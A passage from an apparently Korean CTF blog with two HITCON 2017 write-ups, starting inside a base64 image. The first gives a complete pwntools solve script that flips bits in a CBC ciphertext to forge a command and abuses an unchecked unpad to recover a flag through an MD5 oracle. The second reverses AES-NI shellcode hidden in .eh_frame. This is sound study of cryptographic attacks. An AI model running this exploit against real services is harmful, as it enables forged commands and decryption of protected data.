i+T5wA55hMmVspbsvm63LmkLgfO6LKuTUS+ko77+TTfq+3fU17/p3L8F9Tog+5HU6yeBLfpc7jFERWMb4Bmiy+y5Bb53SvKddw4grfnA74guuZYx4CWp972s79XAw8BhROvU3sDhwD5EJeq21LwbEC1D2xMVqTUF8ls0zw92SeMxYJMu87Rbl7S5SVqSJClHv3e9dbO2w7QXEt1M+wG3Jp/lDbTOegvRbbUXE5WSbml1ysdSYFtiG7QqLTsSlZh+nUdU+l5EjFlaBiwhWoV2ZWrt/+XAdkSl66mc9LL5L5LnblcYi4lxXT/vMl/euqT9CfDDLmlIkjSyynoY6XLiRJ5nM+AJYjA5ROVppy7pvQj4GtGCla5QdEurUz5uSKafRIy5eh0xiDx7510vzgPeSIwN+0by2c3AvcCpROvPbGA3onXopiTvX0ymZcdkZfM/iDz/mOgO7GddWmYDryYG4EuSpBxlVbI+B3yBuAPu2My064ELiArGVcQYotvo7M+JgeEXEN1rDwCXFkirUz6eAd5KtII9BHyFaCm7odgq5hojBrlvkuQPojXqMKKr726iG+6rwOZEq1Nr2hjRUvXuDvkfRJ6/SQy6bzcOrNO6tLyR2M6/7WG5kiRJjfcl4IRpfP/HTL1DsVejPnBy1Ne/6UZ9/476+jed+1fqYCNgq2l8f/sB5GHUC+mor3/Tjfr+HfX1bzr3r1Rzo15IR339m27U9++or3/TuX8LKmtMliRJ0kizkiVJklQCK1mSJEklsJIlSZJUAitZkiRJJbCSpZm0APhXJn5f8UHgW0z+IW5pWC3A+FZzLcD4Hqh1/tX+b1jMJn5jcgw4nvj9xXXJ/xOSz89K5hsVw7T/1JnxPZXx3RzGd0m6FRKn13t6nfwz8WPSc1OfpfO/KXA58E8zmamKDdP+U2fG91TGd3MY3yWpupLg9OlNr4sFwD3EbyCmZfM/l/gh7en+XM+wGJb9p84WYHznMb6bYQHGd2mqriQ4fXrTy7Qp8DXgHOA1dB7bdwHxI9ZZefk/gejzHwWehOqpl9gG47sd47uejO8aqbqS4PTpTS/bPGAxsIa40rkS+BCwZWa+peT/1mFe/ncAlgwwj3VW9f5Te0VjG4zvdozv+jK+a6LqSoLTe5u+kOoH4q8DngLOBjZL8vVMj99/ust6N0XV+8m/6cc2GN/tVL2v/DO+a2+d04d6etnmAXcBK4AbgYuBv8KWLA2/orENxreGj/FdE1VXEpw+vellckyWmsoxK2oy47tGqq4kOH160+tiAXHXybMzn2fz790pGkYLML7VXAswvktTdSXB6dObXif/QjxHpd1zVuYCP8LnrGg4Gd9qMuO7JFUPwvOv+9+wKPLE4P+NTwzWcDK+1WTGtzQk9if67MeJQtr67au9q8yUNCDGt5rM+JaGyDC1xEm9Mr7VZMZ3Qd3uLJAkSVIfrGRJkiSVwEqWZtqmXd5Lw8z4VpMZ31LNnUM8cXhd8v/sarMjDZTxrSYzvntkS5Zm2lPAtcnrRcl7qSmMbzWZ8S3V3CuBx4kroceAV1SbHWmgjG81mfEt1dws4FaikN5ccV6kQTO+1WTGd4/sLtRMWwfcnby+t8qMSCUwvtVkxnePrGSpCpck/y+uNBdSOYxvNZnxLdXc5sDq5L/UNMa3msz47oE/6KgqrAa2AL5fdUakEhjfajLjWxoCPsROTWZ8q8mMb0mSJEmSJKlRZlWdARW2ruoMqCvLU/+M7/ozvvtnfNef8T3iuhVSp9d7ujqrev84fXrT1VnV+8fp05veN5+TJUmSVAIrWZIkSSWwkiVJklQCK1mSJEklsJIlSZJUAitZkiRJJbCSJUmSVAIrWZIkSSXwCafDw4cB1p/lqX/Gd/0Z3/0zvuvP+JYkSZIkSZIkSZIkSZIkSZIkSepmDHjVAOeT6mQM41vNNYbxPaN8TpbyLCZuOV4HPAScD2zRYxqnAPcVnPcBBlegB5mWmsn4VpMZ3zViJUvtvBtYH3gt8GLgcz1+/zyigEt1ZHyryYzvmrCSpXbWAk8DdwHfAfbImeczxNXO48CNwP6paWNMXJGMA58AfpGk93VgTjLtTGAb4NLkO8ckn28NXAgsTz7/SPL5C4AVwCuS9/OJg8GCDmlJWca3msz4lmpsMXB08nou8B/ElQ1MLnxHEoVpNnAssAzYOGe+ceAi4spqfeA64KjU8rJNxLOAa4DTgI2AHYBfA4ck048FbgeeBVyRzNcuLSnL+FaTGd9SzS0GHiUK12qikG6bTBujfSEYY+KKKT3fOJOvkj5L54K1B7CKKPwtHySuoFouBW4FbgE27JCWlGV8q8mM7xqZ030WjaiTgO8BK4Gn2sxzDFF4tgGeIZp+n9tm3kdSr5+k80DMHYiCd1vqsw2Am1LvzyEK6vuBNR3SkvIY32oy47smrGSpnVVE83E7LwTOAPYjrkgA7qG/H9lcm3m/hLgS25X8H1adC5wOfAVYSDRlr2iTlpTH+FaTGd814cB39Wsz4AliICTAW4Cd+kxrObBL6v3NwL3AqUSBnA3sBuydTD8D+BXwPuAy4KwOaUn9ML7VZMb3DLGSpX5dD1xANAFfBRzI5ObhXnwO+ALRtH0scTVzGNF8fTfwMPBVYHPgUOBNwAnJdz9K3KnyrjZpSf0wvtVkxrckSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSVJz7QN8B1gKPAU8DPwIeHtqnpOB3/eR9mnA+HQzOA1/A6xL/T0DPABcAOySmbffdSxiutuhyD4a9Lbud3uUuR27OZ3YLllFtl8vsdJLup8Argdm9bNCM+xK4AcNWEbZDgA+mfN5lbGvGlmv6gyoNv4GuAZ4CXGCOho4EVhFnDzenMy3HLi9igwOyAnAW4DDgTOANxAH+02rzFRBRffRoPW7z6uKlRcCHwBOyXze6/YrGitF0/1n4PnJdDVDu0rWsB8nJQ3Qa4ir9e8Bc3Km7w68cprLmImWrA07TGu1Trw48/nRyed/mvqsji1ZveyjqlsNq/Zl4FeZz3rZfr3ESq9l50vALV3XoHpNbMnqdHzo1/8EHi0hXTWELVkC+DtgDfB+4Omc6bcQ3RwwtQLSOqH/GXATsBq4H/hom2W9DPgZ8ARwN/ChnHl2By4lDl5PAj8H9s3M01ruG4Drkvm+2GaZnaxI/q/fZb4DidaKJ4kWin8HdmuT938DHknm/TXRqtHJe4E/Aid1mKeXfdTSbVu/lOgCu4/Yb78F/gl4dma+dvt8X2ARsZ556ff7PYAjgDuSfC0G3kaxk/LGwLuA8zOf97P9svJipdd0LyD2y6u7LKu1rV4OXM3Etmp1Px5P7K/HgR8D2+ekUTRm/5yJbX078I42eSpSLtsZ9DK6lbN2x4dDiYpy3kXjlUxUzosc104nyuyzmehafiCZlnehVmR/9FJGJA2JVcDlBefNO3GuAe4kThzPBv46+ez4zHyPA78BPkZ0oXyNODAdnJpvjyT964gT7cHEwXQNkw+MpxEHvjuJA+F2wAs65LvVOvEKYG6Sz72AXxIHxk06rOOfEifQK4G3Akcm67ES2CE13yuBPxAn1mOIroTjgH/J5DvdynQiUcH66w55h972UdFtfQjwOaI7bH/gPcTJ6upMenn7fDVwI7AA2Ab4cE76/X7vvwBrge8SJ6ajiBPNUrpXst6QpLdX5vNetl8vsdJLugCziRhZ2GW+1j68E/ggEXeXE7FyKrGP3gn8JfAg8B+Z7xeN2da2/j7wpiS9+5m6rYuWyzyDXkbRcpZ3fJidLPvsTB53SfL4vtT3ux3X5hEXJY8BOyZ/2yXT+j2GFC0jkoZE6yrsywXnzztxrgMOysx3JnHwn5OZ789S88wiTp7npT67Ahhj8olsPeBm4oCbXe4BBfOdHczc+ruHaFlIy67jIqLVIN0d9HxigPOZqc9+Cvwuk/esViVrFjHO5wnioNtJr/uo6LbOs2fy3fQ2abfPsxWZmzLp9/u9q4iTTNruyXe7VbI+lcyX7hrqdfsVjZVe021ZRPeKWWtbHZj6bEsmBuFvnPr8A8m8W2eWUSRmf0a0LKV7NV7N1G1dtFzmGfQyipazdseHk4kKbHps3eeJCnMrzaLHtXbdhf0eQ4qWEQ0Juws1CGuB/5v57AriKmzH1GdrmHxyWQfcShxsADYgrnovIq5U0+n/AHh9ZhlPA//ZY17fRTTF70dcTS5L8trurrGNiAPehUzuDrqfqAzsn7zfMEnz/Eze88xO5vtL4iR6aY/rUES3bQ3R7fVRojvrIeIKelEy7UVd0n+CaNlJ+20m/X6+NwvYG7g4M88twF1d0gZ4HnFyW1Ng3m56jZWiHiby2c0aouWj5SFiQPVPiW6kltuS/60uw6IxO4u4K/K7RBlrWQTcm3rfa7lMG/Qyeiln7Y4P5yTpvCu17PcA38pZdpHjWjdF90dLv2VLNZQ3UFOjZRXR3L3TNNJ4jKnjUR5J/m9LtKBAXPGtzcy3hjgIATyHOPF/CPivmflmJ3/ZZWTT6+YGogug5XKi2+LTwLtz5t+cuBjJG0g+TtxR1ppvNnGF3c1c4q61q5io1HTSzz7qtq0hrt6PI7osryWu7rcA/l9mvjyP53z2xwF8bx5xAlyeM9+yLmlDxM8fM5/1G+PdYqXfdP9InNi7abcPV+R8BhPbsGjMtrb10pz50p/1Wi7TBr2MXspZu+PDMqISfxxwFjHObcvkdVrR41o3RfdHS79lSzVkJUsQV8YHEQfE7AG8iM2BZxFXYC3bJv+LHAxbVhHdIV9mchN6mR4lul927zB9LXH1mrUNE9vrUeKAvF3OfFmriDEnlwHfBv6C/EHTadPdR3mOBv6R6LZsedWA0u7XSqLSsFXOtK2JbdfJQ0Q33npMPsEOYvvlxUo/6c5L8lmWojG7gtjWz8mZbx4T3WDTKZeDXkYv5ayTLxOtXPsQla1riZbetEEd14ruDzWQ3YWCaNHYkBgM2u8jHP4i8/4oYuzCWA/5WE0c+BYQXQl35vwN2pZEM3y7k95q4BfE3VHZ8RT7MdEdsYZomTqKaKnq5ipiIOtBxLOUut3dOIh9lDaLOIFkx5Mc0UMaZVhLbO/DM5+/jHj+VTe3Ese17E0Qg9h+ebHST7ovotzHOBSN2XXEIPP0uC+IrrA/yaT3n/RXLge9jF7LWTs/I7pZP09012VbsVq6HdeyrcN5iu4PNZAtWYK4ivtvRIvGjcQAyzHiSu4A4uBwaIfv/wH478BmxG3a7yAGcx9P9xaarI8Rd05dTdwttITowmq1sPxdj+llLSDG1MwC5hODhjcgHhTZzilEV9EVyXybAH9PrPfnU/P9LdHVdh1xu/gSYGfirqkP5KR7NVHJupwYr3EEU7u6WnsVpQsAAAIWSURBVKa7j7LWAT8BjiXGhN1P3K12TA9plOXvibEwFwLnEvv/fxBdK926h39GrNs+TB7D1c/2W0D3WOk13R2JFrnsWJ9BKxqzC5O8nJTMtxVxJ+rqTHrTKZeDXkav5aydLyf5WUnEWlaR49ptRCX7w0QsrCa/Al10f0hqsFcTB5sHiZP9w8APmXySaPfso32Ig95q4qD3sUza7R6Q+W2mjkt6cfL5cuJK8QHgEiZfDff6wM28O8aWERWNN2Tm7faMm8do/8yhPZn8nJ87iZ9T6ZTvVxPdJZfQfaxOkX1UdFtvnaS1MlmnHwKvI7ZN+qnk7fZ5t/T7/R5Ehe9OYv+3nqv0S+CbOd/P+hFTB863FNl+vcRKL+lC3GjwEN0fjNluW40Rz2fKLnsdUwegF43ZI5jY1ncTlYi8Z5IVKZftDHoZ/ZSzrK2I7falnGlFj2uzgf9D7O+1FH9OVrv90UsZkTQCRv3p4poZzyOu+j9SYN6DiBP01t1mrMDNxLPJVL33kv9kf/C4JqkmPBhp0OYSD3k8lGhZO5oYa7WM6D4q4ifkt1BU6TAmBuarOrsSD+h9gPaPT/G4JqkWPBhp0DYiuogeJB7WuILo/uv27K60bWnftVeVPWl/F6tmzpVEXF1F+7sUPa5JkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJkiRJVfj/AcrXp9SkF+EAAAAASUVORK5CYII="><br>AES가 CBC 모드로 운영중이고, ‘Welcome!!’ 문자열의 암호화된 값과 평문을 알고 있으므로 CBC 모드의 취약한 부분을 이용하면 복호화할때 만들어지는 평문을 임의로 조작할 수 있다. 암호화된 블럭 C0,C1,C2,C3 에서 C0의 첫번째 바이트를 바꾸면 P1의 첫번째 바이트가 변경된다. C1이 복호화된후에 C0과 XOR 연산을 진행하기 때문이다. 물론 C0은 정상적으로 복호화되지 않는다. 이때 P1을 알고있으면 예측할 수 있는 변경을 도입할 수 있다. 우리는 암호화에 사용되는 IV와 C1,P1 모두 알고있으므로 IV을 적절히 변경시키면 P1에 ‘get-flag’ 문자열을 만들 수 있다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(cmd,plain,cipher)</span>:</span></span><br><span class="line">	plain  = pad(plain)</span><br><span class="line">	iv, cipher = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">	iv_a = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cmd)):</span><br><span class="line">		iv_a += chr(ord(cmd[i]) ^ (ord(plain[i])^ord(iv[i])))</span><br><span class="line"></span><br><span class="line">	iv = iv_a + iv[len(cmd):]</span><br><span class="line">	<span class="keyword">return</span> b64encode(iv+cipher)</span><br><span class="line"></span><br><span class="line">s.sendline(command(<span class="string">'get-flag'</span>,<span class="string">'Welcome!!'</span>,Welcome_enc))</span><br><span class="line">flag_enc = b64decode(s.recvline()[:<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h4 id="Stage-2-Decrypt-flag-enc"><a href="#Stage-2-Decrypt-flag-enc" class="headerlink" title="Stage 2 - Decrypt flag_enc"></a>Stage 2 - Decrypt flag_enc</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> msg[:-ord(msg[<span class="number">-1</span>])]</span><br></pre></td></tr></table></figure>
<p>flag_enc를 복호화하기 위해서 unpad 함수에서 발생하는 취약점을 이용해야 한다. 별다른 검사가 없기 때문에 평문의 마지막 바이트를 조작할 수 있으면 내가 원하는 곳까지 자를 수 있다. </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpadding</span><span class="params">(n)</span>:</span></span><br><span class="line">	plain  = pad(<span class="string">'Welcome!!'</span>)</span><br><span class="line">	cipher = Welcome_enc</span><br><span class="line">	iv, cipher = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">	iv = iv[:<span class="number">15</span>] + chr(n ^ (ord(plain[<span class="number">15</span>])^ord(iv[<span class="number">15</span>])))</span><br><span class="line">	<span class="keyword">return</span> iv+cipher</span><br></pre></td></tr></table></figure>
<p>CBC 모드에서 C0,C1,C2,C3 블럭이 있을 때 뒤에 추가로 C1,C2를 추가하여 복호화를 진행하면 P1,P2,P3,X,P2 라는 결과를 얻을 수 있다. 한 마디로 암호화 블럭을 추가하여 임의의 메시지를 추가할 수 있는 것이다. ‘Welcome!!’ 의 암호화 블럭 C0,C1을 flag_enc 끝에 추가하면 마지막 바이트를 조작할 수 있다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prefix_guess</span><span class="params">(prefix,block_idx=<span class="number">0</span>)</span>:</span></span><br><span class="line">	cnt = <span class="number">1</span></span><br><span class="line">	flag = <span class="string">''</span></span><br><span class="line">	<span class="keyword">while</span> cnt&lt;=<span class="number">9</span>:</span><br><span class="line">		cmd = command(<span class="string">'get-md5'</span>,prefix+flag,flag_enc[<span class="number">16</span>*block_idx:]+unpadding(<span class="number">64</span>+<span class="number">9</span><span class="number">-16</span>*block_idx-cnt))</span><br><span class="line">		s.sendline(cmd)</span><br><span class="line">		res1 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">			cmd = command(<span class="string">'get-md5'</span>+flag+c,<span class="string">'Welcome!!'</span>,Welcome_enc+unpadding(<span class="number">32</span>+<span class="number">9</span>-cnt))</span><br><span class="line">			s.sendline(cmd)</span><br><span class="line">			res2 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">			<span class="keyword">if</span> res1==res2:</span><br><span class="line">				cnt += <span class="number">1</span></span><br><span class="line">				flag += c</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">'hitcon&#123;'</span>	<span class="comment"># prefix of first block</span></span><br><span class="line">flag_0 = prefix + prefix_guess(prefix,<span class="number">0</span>)	<span class="comment"># get first blcok</span></span><br></pre></td></tr></table></figure>
<p>flag_enc 의 평문이 ‘hitcon{‘ 으로 시작한다는 것을 알고 있으므로 ‘hitcon{‘ 을 ‘get-md5’로 바꾸고 ‘get-md5’ 뒤에 한 바이트만 남기고 자르면 flag의 1번째 글자가 md5로 암호화된 결과를 알 수 있다. 결국 ‘Welcome!!’ 을 ‘get-md5X’(X = 모든 아스키범위) 의 형태로 바꾼 뒤에 결과값을 가지고와 비교하는 방식으로 알아낼 수 있다. 계속 1글자씩 늘리다보면 flag_enc의 1번째 평문 블록(P1)까지 알아낼 수 있다. IV를 조작해 ‘get-md5XXXXXXXXX’ 형태까지 만들 수 있지만 16바이트를 넘게 만들지 못하기 때문에 2번째 평문 블록은 이 방식으로 알아낼 수 없다.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = recv_msg().strip()</span><br></pre></td></tr></table></figure>
<p>msg를 받을 때 strip을 사용하는 점을 통해 2번째 평문 블록을 알아낼 수 있다. 위에서 알아낸 flag_enc의 첫번째 블록을 ‘      get-md5’로 바꾸고 2번째 평문 블록의 1바이트만 남기고 자르는 것이다. 이 방식으로 2번째 평문 블록의 9글자 정도를 알아낼 수 있으므로 알아낸 9글자를 가지고 다시 위의 과정을 반복하면 2번째 평문 블록의 전체를 알아낼 수 있다.<br><br><br></p>
<h4 id="Solve-py"><a href="#Solve-py" class="headerlink" title="Solve.py"></a>Solve.py</h4><p>로컬에서 환경을 구축하여 만들었기 때문에 pow 과정을 제외하였다.<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode,b64encode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">'localhost'</span>,<span class="number">12345</span>)</span><br><span class="line">Welcome_enc = b64decode(s.recvline()[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(msg)</span>:</span></span><br><span class="line">    pad_length = <span class="number">16</span>-len(msg)%<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> msg+chr(pad_length)*pad_length</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(cmd,plain,cipher)</span>:</span></span><br><span class="line">	plain  = pad(plain)</span><br><span class="line">	iv, cipher = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">	iv_a = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(cmd)):</span><br><span class="line">		iv_a += chr(ord(cmd[i]) ^ (ord(plain[i])^ord(iv[i])))</span><br><span class="line"></span><br><span class="line">	iv = iv_a + iv[len(cmd):]</span><br><span class="line">	<span class="keyword">return</span> b64encode(iv+cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpadding</span><span class="params">(n)</span>:</span></span><br><span class="line">	plain  = pad(<span class="string">'Welcome!!'</span>)</span><br><span class="line">	cipher = Welcome_enc</span><br><span class="line">	iv, cipher = cipher[:<span class="number">16</span>], cipher[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">	iv = iv[:<span class="number">15</span>] + chr(n ^ (ord(plain[<span class="number">15</span>])^ord(iv[<span class="number">15</span>])))</span><br><span class="line">	<span class="keyword">return</span> iv+cipher</span><br><span class="line"></span><br><span class="line">s.sendline(command(<span class="string">'get-flag'</span>,<span class="string">'Welcome!!'</span>,Welcome_enc))</span><br><span class="line">flag_enc = b64decode(s.recvline()[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">s.sendline(b64encode(Welcome_enc))</span><br><span class="line">command_not_enc = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prefix_guess</span><span class="params">(prefix,block_idx=<span class="number">0</span>)</span>:</span></span><br><span class="line">	cnt = <span class="number">1</span></span><br><span class="line">	flag = <span class="string">''</span></span><br><span class="line">	<span class="keyword">while</span> cnt&lt;=<span class="number">9</span>:</span><br><span class="line">		cmd = command(<span class="string">'get-md5'</span>,prefix+flag,flag_enc[<span class="number">16</span>*block_idx:]+unpadding(<span class="number">64</span>+<span class="number">9</span><span class="number">-16</span>*block_idx-cnt))</span><br><span class="line">		s.sendline(cmd)</span><br><span class="line">		res1 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">			cmd = command(<span class="string">'get-md5'</span>+flag+c,<span class="string">'Welcome!!'</span>,Welcome_enc+unpadding(<span class="number">32</span>+<span class="number">9</span>-cnt))</span><br><span class="line">			s.sendline(cmd)</span><br><span class="line">			res2 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">			<span class="keyword">if</span> res1==res2:</span><br><span class="line">				cnt += <span class="number">1</span></span><br><span class="line">				flag += c</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag -&gt; first_block + second_block</span></span><br><span class="line">prefix = <span class="string">'hitcon&#123;'</span>	<span class="comment"># prefix of first block</span></span><br><span class="line">flag_0 = prefix + prefix_guess(prefix,<span class="number">0</span>)	<span class="comment"># get first blcok</span></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">1</span>				<span class="comment"># get prefix of second block</span></span><br><span class="line">flag_1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> cnt&lt;=<span class="number">9</span>:	</span><br><span class="line">	cmd = command(<span class="string">'get-md5'</span>.rjust(<span class="number">16</span>,<span class="string">' '</span>),flag_0,flag_enc+unpadding(<span class="number">64</span>-cnt))</span><br><span class="line">	s.sendline(cmd)</span><br><span class="line">	res1 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">		cmd = command(<span class="string">'get-md5'</span>+flag_1+c,<span class="string">'Welcome!!'</span>,Welcome_enc+unpadding(<span class="number">32</span>+<span class="number">9</span>-cnt))</span><br><span class="line">		s.sendline(cmd)</span><br><span class="line">		res2 = s.recvline()[:<span class="number">-1</span>]</span><br><span class="line">		<span class="keyword">if</span> res1==res2:</span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">			flag_1 += c</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">prefix = flag_1[:<span class="number">7</span>]</span><br><span class="line">flag = flag_0 + prefix + prefix_guess(prefix,<span class="number">1</span>) <span class="comment"># get second block</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/09/HITCON-2017-Everlasting-Imaginative-Void/">HITCON 2017 - Everlasting Imaginative Void</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-09T09:51:28.000Z" itemprop="datePublished">
    2018-01-09
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/reversing/">Reversing</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _isoc99_scanf(&amp;aS, &amp;input, a3);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"hitcon&#123;%s&#125;\n"</span>, &amp;input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>main 소스를 확인해보면 flag를 입력받고 출력해주는 소스밖에 없다. flag를 검사하는 루틴이 생성자나 소멸자에 있을 수 있다고 생각해 init_array와 fini_array를 확인해보았다. 동적 디버깅 상태에서 fini_array를 확인해보면 .eh_frame 영역에 저장되었는 쉘코드의 주소가 들어가 있다. 쉘코드는 처음에 입력한 flag의 16번째 글자가 ‘!’일때 aesenc 명령어를 통해 aes 암호화를 진행하고 마지막에 ucomisd 명령어로 비교하는 코드였다.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.eh_frame:0000564119ED085F mov     rsi, rbx</span><br><span class="line">.eh_frame:0000564119ED0862 sub     si, 0C7h</span><br><span class="line">.eh_frame:0000564119ED0867 add     rbx, 2007E1h</span><br><span class="line">.eh_frame:0000564119ED086E movdqu  xmm1, xmmword ptr [rbx]</span><br><span class="line">.eh_frame:0000564119ED0872 movdqu  xmm0, xmmword ptr [rsi]</span><br><span class="line">.eh_frame:0000564119ED0876 pxor    xmm1, xmm0</span><br><span class="line">.eh_frame:0000564119ED087A push    0Ah</span><br><span class="line">.eh_frame:0000564119ED087C pop     rdi</span><br><span class="line">.eh_frame:0000564119ED087D</span><br><span class="line">.eh_frame:0000564119ED087D loc_564119ED087D:                       ; CODE XREF: .eh_frame:0000564119ED0892j</span><br><span class="line">.eh_frame:0000564119ED087D add     rsi, 10h</span><br><span class="line">.eh_frame:0000564119ED0881 movdqu  xmm0, xmmword ptr [rsi]</span><br><span class="line">.eh_frame:0000564119ED0885 dec     edi</span><br><span class="line">.eh_frame:0000564119ED0887 test    edi, edi</span><br><span class="line">.eh_frame:0000564119ED0889 jz      short loc_564119ED0894</span><br><span class="line">.eh_frame:0000564119ED088B js      short loc_564119ED089B</span><br><span class="line">.eh_frame:0000564119ED088D aesenc  xmm1, xmm0</span><br><span class="line">.eh_frame:0000564119ED0892 jmp     short loc_564119ED087D</span><br><span class="line">.eh_frame:0000564119ED0894 ; ---------------------------------------------------------------------------</span><br><span class="line">.eh_frame:0000564119ED0894 loc_564119ED0894:                       ; CODE XREF: .eh_frame:0000564119ED0889j</span><br><span class="line">.eh_frame:0000564119ED0894 aesenclast xmm1, xmm0</span><br><span class="line">.eh_frame:0000564119ED0899 jmp     short loc_564119ED087D</span><br><span class="line">.eh_frame:0000564119ED089B ; ---------------------------------------------------------------------------</span><br><span class="line">.eh_frame:0000564119ED089B loc_564119ED089B:                       ; CODE XREF: .eh_frame:0000564119ED088Bj</span><br><span class="line">.eh_frame:0000564119ED089B ucomisd xmm0, xmm1</span><br><span class="line">.eh_frame:0000564119ED089F jz      short near ptr unk_564119ED08A2</span><br><span class="line">.eh_frame:0000564119ED08A1 retn</span><br></pre></td></tr></table></figure>
<p>위의 코드가 aes 암호화와 비교가 진행되는 부분의 쉘코드다. aes 암호화는 init round, 9번의 round, final round를 통해 암호화를 진행하는데 쉘코드도 aes의 암호화 루틴과 비슷하지만, 키를 생성하지 않고 bss영역에서 데이터를 불러와 키로 사용한다. 복호화를 하기 위해 aes instruction set에 대해 알아보았다. 키 생성은 aeskeygenassist 를 이용하고 암호화에는 aesenc, aesenclast 복호화에는 aesdec, aesimc, aesdeclast 를 사용한다.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xmm0 - plaintext</span><br><span class="line">xmm1~xmm11 - scheduled keys</span><br><span class="line">pxor xmm0, xmm1 /∗ Round 0 (whitening) ∗/</span><br><span class="line">aesenc xmm0, xmm2 /∗ Round 1 ∗/</span><br><span class="line">aesenc xmm0, xmm3 /∗ Round 2 ∗/</span><br><span class="line">aesenc xmm0, xmm4 /∗ Round 3 ∗/</span><br><span class="line">aesenc xmm0, xmm5 /∗ Round 4 ∗/</span><br><span class="line">aesenc xmm0, xmm6 /∗ Round 5 ∗/</span><br><span class="line">aesenc xmm0, xmm7 /∗ Round 6 ∗/</span><br><span class="line">aesenc xmm0, xmm8 /∗ Round 7 ∗/</span><br><span class="line">aesenc xmm0, xmm9 /∗ Round 8 ∗/</span><br><span class="line">aesenc xmm0, xmm10 /∗ Round 9 ∗/</span><br><span class="line">aesenclast xmm0, xmm11 /∗ Round 10 ∗/</span><br></pre></td></tr></table></figure>
<p>aes encrypt 과정을 어셈으로 구현한 코드다. 복호화에는 암호화에서 사용한 마지막 key가 첫번째 key가 되고, aesimc 명령어를 통해 inverse cipher key를 구해서 사용한다.</p>
